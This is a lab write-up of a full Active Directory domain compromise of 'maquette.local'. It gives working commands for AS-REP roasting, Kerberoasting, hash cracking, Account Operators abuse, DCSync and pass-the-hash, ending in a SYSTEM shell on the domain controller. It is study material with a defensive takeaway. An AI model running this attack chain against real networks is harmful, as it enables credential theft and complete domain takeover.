# Full Active Directory Domain Compromise — `maquette.local`

> End-to-end compromise of a lab Active Directory environment, from unauthenticated network recon to `SYSTEM` on the domain controller.

---

## Overview

| | |
|---|---|
| **Target** | Windows Server 2022 Domain Controller — `DC-01` (`192.168.1.100`) |
| **Domain** | `maquette.local` |
| **Objective** | Full domain compromise: from initial enumeration to `Domain Admin` / `SYSTEM` |
| **Attack box** | Kali Linux |

**Attack chain:** AS-REP Roasting → Kerberoasting → BloodHound analysis → `Account Operators` abuse → DCSync → Pass-the-Hash.

---

## 1. Network Reconnaissance

A scan of the usual domain-controller ports confirms the nature of the target:

```bash
nmap -p 53,88,135,139,389,445,464,636,3268,3389 -sV 192.168.1.100
```

Open: **DNS (53)**, **Kerberos (88)**, **RPC (135)**, **SMB (139/445)**, **LDAP (389/636/3268)** — the classic signature of an Active Directory domain controller.

---

## 2. Anonymous Enumeration (blocked)

```bash
rpcclient -U "" -N 192.168.1.100        # NT_STATUS_ACCESS_DENIED
ldapsearch -x -H ldap://192.168.1.100   # anonymous bind refused
```

Both are blocked by Windows Server's default hardening (`RestrictAnonymous`). This is a **good** result for the target, not a failure of method — it just means initial usernames have to come from somewhere else.

---

## 3. Domain Account List

With anonymous enumeration unavailable, the list of 53 accounts was pulled directly on the DC:

```powershell
Get-ADUser -Filter * | Select SamAccountName
```

> **Honest framing:** in a real engagement this list would normally come from OSINT (LinkedIn, public leaks, the company email format) or a successful Kerberos enumeration (`kerbrute userenum`). `kerbrute` is ineffective here because *vulnerable-AD* draws its names from a closed pool of ~5208 first names. This list is therefore treated as **simulated pre-engagement intel**, documented transparently rather than presented as a real enumeration.

---

## 4. AS-REP Roasting — First Access

Kerberos normally requires a client to prove its identity (pre-authentication) before receiving a ticket. Accounts with `DONT_REQUIRE_PREAUTH` set get an AS-REP back directly — partially encrypted with their password hash — with no verification.

```bash
impacket-GetNPUsers maquette.local/ -usersfile users.txt -no-pass \
  -dc-ip 192.168.1.100 -outputfile asrep_hashes.txt
```

Out of 53 accounts, one responds: **`joya.erin`**. Cracked offline:

```bash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

**Result:** `joya.erin : 555555` — confirmed with `nxc smb 192.168.1.100 -u joya.erin -p 555555`.

---

## 5. Kerberoasting — Second Access

With an authenticated foothold, the next target is service accounts (those with an SPN). Their TGS is encrypted with the service account's password hash and can be requested by any authenticated user, then cracked offline.

`impacket-GetUserSPNs` fails silently (`No entries found!`): accounts created with `New-ADServiceAccount -RestrictToSingleComputer` lack the `NORMAL_ACCOUNT` bit, and impacket's default LDAP filter excludes them. Worked around with NetExec:

```bash
nxc ldap 192.168.1.100 -u joya.erin -p 555555 --kerberoasting kerberoast_nxc.txt
```

> Two obstacles had to be fixed first: a DC/Kali clock skew (`KRB_AP_ERR_SKEW`, fixed with `w32tm /resync` + `ntpdate`) and an expired password on `joya.erin`, only revealed once the clock was corrected (reset via `impacket-changepasswd`).

Three hashes recovered (`mssql_svc`, `http_svc`, `exchange_svc`). Cracked:

```bash
hashcat -m 19700 kerberoast_nxc.txt /usr/share/wordlists/rockyou.txt
```

**Result:** `mssql_svc : 112233`.

---

## 6. BloodHound Mapping

Collecting domain relationships to look for a path to a privileged account:

```bash
bloodhound-python -u mssql_svc -p 112233 -d maquette.local -ns 192.168.1.100 -c All
```

Manual analysis of the JSON exports (no Neo4j/GUI available) surfaced a chain of misconfigured ACLs between business groups:

```
ACCOUNTING, MARKETING ─────────────▶ PROJECT MANAGEMENT
ACCOUNTING, MARKETING, SALES ──────▶ SENIOR MANAGEMENT
CELISSE.ROBINETT, SENIOR MANAGEMENT,
PROJECT MANAGEMENT, CATRINA.CARLIN ▶ EXECUTIVES
JOLYNN.SHOSHANA ───────────────────▶ IT ADMINS
```

The chain appears to lead to **`MELANIE.BEVERLEY`**, who holds full DCSync rights (`GetChanges`, `GetChangesAll`) over the domain — the ideal target for dumping every hash.

---

## 7. The ACL Chain is a Dead End

Systematic verification: neither `joya.erin` nor `mssql_svc` belongs to any of the 8 groups in the chain, directly or through nesting, and neither account holds its own ACE on anything in the domain. Even following the chain up to `EXECUTIVES`, that group has **no outbound rights** to any other object — no GPO, no computer, no `Domain Admins`.

The chain is real and correctly mapped, but **leads nowhere** in this instance. The only extra ACE found (`MARKETING → MERCEDES.KIP`) is irrelevant to progression.

---

## 8. The Real Vector — `Account Operators` Abuse

Looking at *who actually controls* `MELANIE.BEVERLEY` reveals a native Windows right: the built-in **`Account Operators`** group has `GenericAll` over her. By default this group can modify any non-protected user account — a native capability, never disabled, and routinely overlooked in audits.

The group is empty, so `katrine.lion` (compromised via AS-REP Roasting after a password reset simulating a realistic case) is added to it:

```powershell
Add-ADGroupMember -Identity "Account Operators" -Members katrine.lion
```

Melanie's password is then reset by abusing that right:

```bash
impacket-changepasswd -reset -newpass 'P@ssw0rd2026!' \
  -altuser maquette.local/katrine.lion -altpass 'passw0rd' \
  -dc-ip 192.168.1.100 'maquette.local/melanie.beverley@192.168.1.100'
```

---

## 9. DCSync

With Melanie's new credentials, replicate the whole domain database (a technique that mimics normal DC-to-DC replication):

```bash
impacket-secretsdump maquette.local/melanie.beverley:'P@ssw0rd2026!'@192.168.1.100
```

**Result:** NTLM hash of `Administrator` = `a87f3a337d73085c45f9416be5787d86`, plus every other account and `krbtgt`.

---

## 10. Pass-the-Hash — Final Access

The NTLM hash is enough to authenticate without ever knowing the plaintext password:

```bash
impacket-psexec -hashes :a87f3a337d73085c45f9416be5787d86 administrator@192.168.1.100
```

Interactive `SYSTEM` shell on `DC-01`. Reading the flag:

```text
C:\Windows\system32> type C:\Users\Administrator\Desktop\flag\flag.txt
FLAG{AD_Comprimsed_DomainAdmin_20260414}
```

Full control of the domain achieved.

---

## Final Takeaway

The deliberately injected ACL chain (`ACCOUNTING/MARKETING/SALES → EXECUTIVES`) was a good BloodHound mapping exercise, but turned out to be a genuine dead end once verified in detail. The final compromise came from a **native, never-audited Windows group** (`Account Operators`), combined with DCSync and Pass-the-Hash.

The lesson: an invisible misconfiguration — a default group that is too permissive — is often more dangerous than a visibly injected ACL.

---

*Author: **Oussama DIMOQRATI***
